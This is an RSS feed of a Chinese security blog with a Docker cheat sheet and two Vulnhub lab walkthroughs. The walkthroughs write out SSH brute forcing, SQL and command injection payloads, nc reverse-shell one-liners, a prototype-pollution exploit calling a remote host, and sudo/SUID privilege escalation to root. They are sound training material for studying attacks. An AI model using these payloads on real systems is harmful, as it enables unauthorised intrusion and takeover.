<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>方糖</title>
    <link>https://0a00.github.io/</link>
    
    <atom:link href="https://0a00.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>克己 慎独 守心 明性</description>
    <pubDate>Sat, 26 Nov 2022 07:47:19 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Docker使用参考</title>
      <link>https://0a00.github.io/2022/11/26/docker1/</link>
      <guid>https://0a00.github.io/2022/11/26/docker1/</guid>
      <pubDate>Sat, 26 Nov 2022 06:02:52 GMT</pubDate>
      
      <description>docker</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><h6 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h6><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>描述: Docker 是一个用于开发、交付和运行应用程序的开放平台。 Docker 使您能够将应用程序与基础架构分开，以便 您可以快速交付软件。使用 Docker，您可以管理您的基础架构 以与管理应用程序相同的方式。通过利用 Docker 的 快速传送、测试和部署代码的方法，您可以 显著减少编写代码和在生产环境中运行代码之间的延迟。</p></div></div></div><h1 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h1><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">docker ps列出正在运行的容器</span><br><span class="line">docker ps -a列出所有容器</span><br><span class="line">docker ps -s列出正在运行的容器 (带 CPU / 内存)</span><br><span class="line">docker images列出所有镜像</span><br><span class="line">docker exec -it &lt;container&gt;  bash连接到容器</span><br><span class="line">docker logs &lt;container&gt;显示容器的控制台日志</span><br><span class="line">docker stop &lt;container&gt;停止容器</span><br><span class="line">docker restart &lt;container&gt;重启一个容器</span><br><span class="line">docker rm &lt;container&gt;移除一个容器</span><br><span class="line">docker port &lt;container&gt;显示容器的端口映射</span><br><span class="line">docker top &lt;container&gt;列出进程</span><br><span class="line">docker kill &lt;container&gt;杀死一个容器</span><br><span class="line"></span><br><span class="line">docker start nginx-server开始</span><br><span class="line">docker stop nginx-server停止</span><br><span class="line">docker restart nginx-server重启</span><br><span class="line">docker pause nginx-server暂停</span><br><span class="line">docker unpause nginx-server取消暂停</span><br><span class="line">docker wait nginx-server阻塞容器</span><br><span class="line">docker kill nginx-server发送 SIGKILL</span><br><span class="line">docker attach nginx-server连接到现有容器</span><br><span class="line">docker pull 镜像   从docker registry中拉取镜像</span><br><span class="line"></span><br><span class="line">docker ps列出正在运行的容器</span><br><span class="line">docker ps -a列出所有容器</span><br><span class="line">docker logs nginx-server容器日志</span><br><span class="line">docker inspect nginx-server检查容器</span><br><span class="line">docker events nginx-server容器事件</span><br><span class="line">docker port nginx-server公共端口</span><br><span class="line">docker top nginx-server运行进程</span><br><span class="line">docker stats nginx-server容器资源使用</span><br><span class="line">docker diff nginx-server列出对容器所做的更改</span><br><span class="line"></span><br><span class="line">docker images列出镜像</span><br><span class="line">docker rmi nginx删除镜像</span><br><span class="line">docker load &lt; ubuntu.tar.gz加载一个 tarred 存储库</span><br><span class="line">docker load --input ubuntu.tar加载一个 tarred 存储库</span><br><span class="line">docker save busybox &gt; ubuntu.tar将镜像保存到 tar 存档</span><br><span class="line">docker history显示镜像的历史</span><br><span class="line">docker commit nginx将容器另存为镜像。</span><br><span class="line">docker tag nginx eon01/nginx标记镜像</span><br><span class="line">docker push eon01/nginx推送镜像</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 docker/imagesname  -d后台允许，-p端口映射</span><br><span class="line">docker run -it ubuntu /bin/bash   -i交互式  -t终端</span><br><span class="line"></span><br><span class="line">docker exec id   shell command  容器执行命令</span><br><span class="line">docker exec -u root -it imagesname  /bin/bash</span><br><span class="line">docker exec -it 容器名称 sh  从正在运行的容器中打开一个shell </span><br><span class="line"></span><br><span class="line">docker ps -a 列出所有docker容器（包括停止的）</span><br><span class="line">docker start | stop 容器名称 启动或停止现有容器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载dockerfile，json文件</span><br><span class="line">docker build -t setname    编译镜像，设置名为setname</span><br><span class="line"></span><br><span class="line">更新源代码，重新编译，运行，删除旧容器才可以适用新容器</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker ps 列出获取容器id</span><br><span class="line">docker stop id   停止容器</span><br><span class="line">docker rm id  停止容器后删除容器</span><br><span class="line">docker rm -f id 停止并且删除</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">docker ps -a  列出所有容器</span><br><span class="line">docker kill id 杀死运行中的容器</span><br><span class="line">docker images 列出docker镜像</span><br><span class="line">docker rmi id 删除镜像</span><br><span class="line">docker system prune  删除与容器无关镜像，容器，卷，网络</span><br><span class="line">docker system prune -a 删除任何停止的容器和所有未使用的图像（不仅仅是悬空的图像）</span><br><span class="line">rm -R /var/lib/docker   删除docker数据目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker容器移除后数据不会保存（持久化数据设置）</span><br><span class="line">docker volume create todo-db 创建数据库</span><br><span class="line">设置镜像不能运行，删除后开始设置</span><br><span class="line">docker run -dp 80:80 -v todo-db:/etc/todos images-name  运行时指定卷安装</span><br><span class="line">删除后启动，数据不会清除，</span><br><span class="line">docker volume inspect todo-db 查看卷信息，数据位置信息</span><br><span class="line"></span><br><span class="line">适用绑定挂载（持久化数据，可以控制确切挂载点，实时修改）</span><br><span class="line">docker run -dp 3000:3000 \</span><br><span class="line">     -w /app -v &quot;$(pwd):/app&quot; \</span><br><span class="line">     node:12-alpine \</span><br><span class="line">-w 指定工作目录</span><br><span class="line">-v 将容器种主机当前目录挂载到工作目录</span><br><span class="line"></span><br><span class="line">docker logs -f 容器名称     获取并查看容器日志</span><br></pre></td></tr></table></figure></div></div></div><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p></div></div><div class='timeline-item-content'><h6 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h6><p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br><a href="https://quickref.cn/docs/docker.html">https://quickref.cn/docs/docker.html</a></p></div></div></div><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/tool/">tool</category>
      
      <category domain="https://0a00.github.io/categories/tool/docker/">docker</category>
      
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/docker/">docker</category>
      
      <category domain="https://0a00.github.io/tags/tool/">tool</category>
      
      <category domain="https://0a00.github.io/tags/skill/">skill</category>
      
      
      <comments>https://0a00.github.io/2022/11/26/docker1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vulnhub靶场CHRONOS-1</title>
      <link>https://0a00.github.io/2022/11/17/bc6/</link>
      <guid>https://0a00.github.io/2022/11/17/bc6/</guid>
      <pubDate>Thu, 17 Nov 2022 09:18:31 GMT</pubDate>
      
      <description>Vulnhub靶场</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></p><p>描述:</p><p>难度：中等<br>目标：获得root权限,flag*2</p><p>涉及的任务：<br>端口扫描<br>WEB侦查<br>命令注入<br>数据编解码<br>搜索引擎<br>框架漏洞利用<br>代码审计<br>NC反弹shell<br>本地提权</p></div></div></div><h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p><h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>sudo netdiscover -i eth1  用于目标发现<br>arp-scan  用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p></div></div></div><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -i eth1  指定网卡，对目标网段进行arp主机发现</span><br><span class="line"></span><br><span class="line">确定目标 192.168.56.109  为测试靶机目标</span><br></pre></td></tr></table></figure><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.109 对发现目标进行全端口扫描</span><br><span class="line">nmap -p22,80,8000 -sV 192.168.56.109  对目标开放端口进行服务识别</span><br><span class="line"></span><br><span class="line">通过扫描发现目标开启22,80,8000端口，一个ssh,两个web服务，</span><br><span class="line">80使用apache实现，8000使用nodejs,并且获得了对应版本信息，操作系统版本信息为ubuntu</span><br></pre></td></tr></table></figure><h2 id="服务进攻"><a href="#服务进攻" class="headerlink" title="服务进攻"></a>服务进攻</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV 192.168.56.109  ssh -f   首先对发现的第一个点进行攻击,使用hydra 进行ssh暴力破解</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随后对下一个发现点进行测试，浏览器访问80,8000端口发现源代码里面存在一段相同jscript代码</p><p>通过cyberchef进行js代码美化，使代码便于分析，发现里面存在一个域名，但是并没有解析</p><p>通过本地hosts文件进行解析，使这段js代码能够正常访问这个域名</p><p>随后重新访问80,或者8000网站，js脚本正常加载，域名能够正常访问，发现多出了一个时间显示</p><p>随后使用burpsuite查看请求，发现一个get “&#x2F;date?format&#x3D;”请求,随后页面返回一个当前时间信息</p><p>随后将提交的数据放入cyberchef进行分析，发现编码为base58编码，解密后的信息为linux命令date的参数，猜测为直接调用date 命令返回信息，猜测存在命令注入漏洞</p><p>随后进行测试，将 ;ls 通过base58进行加密后提交，页面显示出目录信息，确定存在命令注入漏洞</p><p>进行命令测试，查找反弹shell的方式,将;ls &#x2F;bin 编码后提交,获得可执行的命令列表，发现存在nc</p><p>尝试利用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vnlp 1111   本地监听1111端口，等待目标连接</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1111 &gt;/tmp/f  通过此命令进行shell 反弹连接</span><br></pre></td></tr></table></figure><p>数据提交后页面显示错误信息，但是并没有影响shell的连接</p><p>账号为www-data，目录下发现web程序的源代码程序，进行代码分析<br>代码中对提交数据进行了判断，如果提交了whoami,id,nc等数据会反馈错误信息，但是并没有进行拦截，所以并不影响nc执行</p><p>随后在上一级目录中发现了另外一个目录<br>在其中一个文件中发现了使用的框架：express，express-fileupload<br>并且本地开启了8080,监听在127.0.0.1 只能当前主机本地访问，所以扫描无法发现</p><p>通过搜索引擎进行查找发现存在漏洞，随后在：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a>  找到漏洞利用代码,修改目标端口，ip信息后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    None, f<span class="string">&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure><p>随后获得另外一个用户的shell,用户目录下存在一个flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l  查看当前用户的sudo权限</span><br><span class="line"></span><br><span class="line">执行后发现当前用户可以无密码sudo执行npm,node</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 9999 &gt;/tmp/m&#x27;)&quot;</span> </span><br><span class="line"></span><br><span class="line">使用sudo权限执行node,通过node调用nc反弹shell,获得root权限</span><br><span class="line">root目录下存在第二个flag</span><br></pre></td></tr></table></figure><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/vulnhub/">vulnhub</category>
      
      
      <category domain="https://0a00.github.io/tags/vulnhub/">vulnhub</category>
      
      <category domain="https://0a00.github.io/tags/web/">web</category>
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      
      <comments>https://0a00.github.io/2022/11/17/bc6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vulnhub靶场BoredHackerBlog</title>
      <link>https://0a00.github.io/2022/11/12/bac5/</link>
      <guid>https://0a00.github.io/2022/11/12/bac5/</guid>
      <pubDate>Sat, 12 Nov 2022 08:08:45 GMT</pubDate>
      
      <description>Vulnhub靶场BoredHackerBlog</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p><p>描述:<br>这是一个云端反病毒扫描程序！是一种基于云的防病毒扫描服务。<br>目前，它处于测试模式。系统要求您测试设置并查找漏洞并升级隐私。</p><p>难度：简单<br>目标：获得root权限</p><p>涉及的任务：<br>端口扫描<br>网页应用攻击<br>SQL注入<br>命令注入<br>暴力破解<br>代码分析</p></div></div></div><h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p><h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>arp-scan  用于目标发现<br>ping      用于目标发现<br>arping    用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p></div></div></div><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l                                                               <span class="comment">#arp发现，确定目标ip地址</span></span><br><span class="line">nmap -sn 192.168.56.1/24                                                          <span class="comment">#ping扫描，禁用端口扫描</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> ping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>                 <span class="comment">#shell 批量ping扫描 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> sudo arping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>     <span class="comment">#shell 批量arping扫描</span></span><br><span class="line"></span><br><span class="line">部分列举，方式很多，根据实际场景进行选择测试</span><br></pre></td></tr></table></figure><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.108    <span class="comment">#进行全端口扫描</span></span><br><span class="line">nmap -p22,8080 192.168.56.108    <span class="comment">#进行端口服务识别</span></span><br><span class="line"></span><br><span class="line">根据发现的主机目标进行全端口扫描，随后进行端口服务发现</span><br></pre></td></tr></table></figure><h2 id="服务入侵"><a href="#服务入侵" class="headerlink" title="服务入侵"></a>服务入侵</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV  192.168.56.108 ssh -f     <span class="comment">#指定账户，密码字典，对目标进行ssh暴力破解 </span></span><br><span class="line"></span><br><span class="line">对发现的服务进行入侵，ssh尝试未果</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh暴力破解长时间未成功，随后web访问8080端口，出现输入框，需要密码，简单测试后发现sql注入漏洞</span><br><span class="line">注入代码：<span class="string">&quot; or 1=1 --  后面有一个空格</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随后进入一个新的页面，简单测试后发现存在命令行注入漏洞</span><br><span class="line">命令行注入代码： | <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过命令行注入，执行nc,反弹shell</span><br><span class="line"><span class="built_in">rm</span> /tmp/m;<span class="built_in">mkfifo</span> /tmp/m;<span class="built_in">cat</span> /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 4444 &gt;/tmp/m</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随后在用户主目录发现拥有suid,root权限的可执行程序，通过此程序调用nc反弹shell,获得root权限</span><br><span class="line">./upload_cloudav <span class="string">&quot;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 5555 &gt;/tmp/m&quot;</span></span><br></pre></td></tr></table></figure><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/vulnhub/">vulnhub</category>
      
      
      <category domain="https://0a00.github.io/tags/vulnhub/">vulnhub</category>
      
      <category domain="https://0a00.github.io/tags/web/">web</category>
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      
      <comments>https://0a00.github.io/2022/11/12/bac5/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
